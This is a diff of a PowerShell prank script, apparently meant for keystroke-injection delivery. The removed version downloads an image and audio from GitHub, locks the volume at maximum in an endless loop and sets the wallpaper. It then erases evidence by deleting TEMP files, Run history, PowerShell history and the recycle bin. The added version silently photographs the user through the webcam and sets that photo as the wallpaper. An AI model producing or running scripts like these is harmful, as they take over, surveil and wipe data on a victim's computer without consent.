@@ -1,106 +1,97 @@
-# Download Image; replace link to $image to add your own image
-
-$image =  "https://raw.githubusercontent.com/VBV11/Prank/refs/heads/main/John.png"
-
-$i = -join($image,"?dl=1")
-iwr $i -O $env:TMP\i.png
-
-# Download MP3 file; replace link to $wav to add your own sound
-
-$wav = "https://github.com/VBV11/Prank/raw/refs/heads/main/JOHN%20PORK%20IS%20CALLING%20%5B1%20Hour%5D%20%5Bnh4Da0PgacI%5D%20(mp3cut.net).mp3"
-
-iwr $wav -O $env:TMP\s.mp3
-
-#----------------------------------------------------------------------------------------------------
-Function Show-Desktop {
-    $shell = New-Object -ComObject "Shell.Application"
-    $shell.MinimizeAll()
+# Trap unhandled exceptions to prevent the script from automatically closing
+trap {
+    Write-Host "An error occurred:`n$($_.Exception.Message)"
+    Write-Host "Press any key to continue..."
+    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
 }
 
-#----------------------------------------------------------------------------------------------------
-function Pause-Script{
-Add-Type -AssemblyName System.Windows.Forms
-$originalPOS = [System.Windows.Forms.Cursor]::Position.X
-$o=New-Object -ComObject WScript.Shell
-
-    while (1) {
-        $pauseTime = 3
-        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
-            break
-        }
-        else {
-            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
-        }
-    }
-}
-
-#----------------------------------------------------------------------------------------------------
-function Play-MP3 {
-    Add-Type -AssemblyName presentationCore
-    $mediaPlayer = New-Object system.windows.media.mediaplayer
-    $mediaPlayer.open("$env:TMP\s.mp3")
-    $mediaPlayer.Volume = 1.0  # Zet volume op 100%
-    $mediaPlayer.Play()
-    while ($true) {
-        Start-Sleep -Seconds 1
-        $o = New-Object -ComObject WScript.Shell
-        for ($i = 0; $i -lt 50; $i++) {
-            $o.SendKeys([char] 175)  # Zorgt ervoor dat volume steeds opnieuw naar 100% gaat
-        }
-    }
-}
-
-#----------------------------------------------------------------------------------------------------
-Function Set-WallPaper {
+# Function to set the camera roll path
+function Set-CameraRollPath {
     param (
-        [parameter(Mandatory=$True)]
-        [string]$Image
+        [string]$newPath
     )
 
-    Add-Type -TypeDefinition @" 
-    using System; 
-    using System.Runtime.InteropServices;
-    public class Params
-    { 
-        [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
-        public static extern int SystemParametersInfo (Int32 uAction, 
-                                                       Int32 uParam, 
-                                                       String lpvParam, 
-                                                       Int32 fuWinIni);
-    }
-"@ 
+    # Setting the new camera roll path
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "{AB5FB87B-7CE2-4F83-915D-550846C9537B}" -Value $newPath
 
-    $SPI_SETDESKWALLPAPER = 0x0014
-    $UpdateIniFile = 0x01
-    $SendChangeEvent = 0x02
-
-    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
-
-    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
+    # Refresh the shell
+    $null = (New-Object -ComObject Shell.Application).NameSpace(0).Self.InvokeVerb("Ref&resh")
 }
 
-#----------------------------------------------------------------------------------------------------
+# New path for the camera roll (change this to your desired location)
+$newCameraRollPath = "$env:userprofile\Pictures\CameraRoll"
 
-$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
+# Check if the new path exists, if not, create it
+if (-not (Test-Path -Path $newCameraRollPath)) {
+    New-Item -ItemType Directory -Path $newCameraRollPath
+}
 
-#----------------------------------------------------------------------------------------------------
-Show-Desktop
-Pause-Script
-Set-WallPaper -Image "$env:TMP\i.png"
-Play-MP3
+# Set the new camera roll path
+Set-CameraRollPath -newPath $newCameraRollPath
 
-#----------------------------------------------------------------------------------------------------
+# Start the Camera app
+Start-Process "microsoft.windows.camera:" -WindowStyle Maximized -ErrorAction Stop
 
-# Cleanup
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+# Wait a few seconds to start the Camera app
+Start-Sleep -Seconds 5
 
-#----------------------------------------------------------------------------------------------------
+# Simulate a keypress to take a photo
 Add-Type -AssemblyName System.Windows.Forms
-$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
-if ($caps -eq $true){
-$key = New-Object -ComObject WScript.Shell
-$key.SendKeys('{CapsLock}')
+[System.Windows.Forms.SendKeys]::SendWait("{Enter}")
+
+# Wait a few seconds to take the photo
+Start-Sleep -Seconds 5
+
+# Close the Camera app
+Get-Process "WindowsCamera" | Stop-Process -Force
+
+# Wait a bit to ensure the app closes properly
+Start-Sleep -Seconds 2
+
+# New Camera Roll path
+$cameraRollPath = $newCameraRollPath
+
+# Find the latest photo in the Camera Roll folder
+$latestPhoto = Get-ChildItem $cameraRollPath | Sort-Object LastWriteTime -Descending | Select-Object -First 1
+
+# If no photo is found, report an error and stop the script
+if (-not $latestPhoto) {
+    throw "Unable to find a photo in the Camera Roll folder."
 }
+
+# Define the folder to save the photo (Desktop)
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+
+# Generate a filename for the photo on the desktop
+$fileName = "photo_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".jpg"
+
+# Move the photo to the desktop
+Move-Item $latestPhoto.FullName -Destination (Join-Path -Path $desktopPath -ChildPath $fileName) -Force -ErrorAction Stop
+
+# Script for setting the wallpaper
+$code = @'
+using System.Runtime.InteropServices; 
+namespace Win32 { 
+    
+    public class Wallpaper { 
+        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
+        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); 
+         
+        public static void SetWallpaper(string thePath) { 
+            SystemParametersInfo(20, 0, thePath, 3); 
+        }
+    }
+}
+'@
+
+# Add the .NET type definition
+Add-Type $code 
+
+# Path for the temporary image used for the wallpaper
+$imagePath = "$env:TEMP\image.jpg"
+
+# Copy the photo to the temporary folder
+Copy-Item (Join-Path -Path $desktopPath -ChildPath $fileName) -Destination $imagePath -Force -ErrorAction Stop
+
+# Set the wallpaper with the photo
+[Win32.Wallpaper]::SetWallpaper($imagePath)
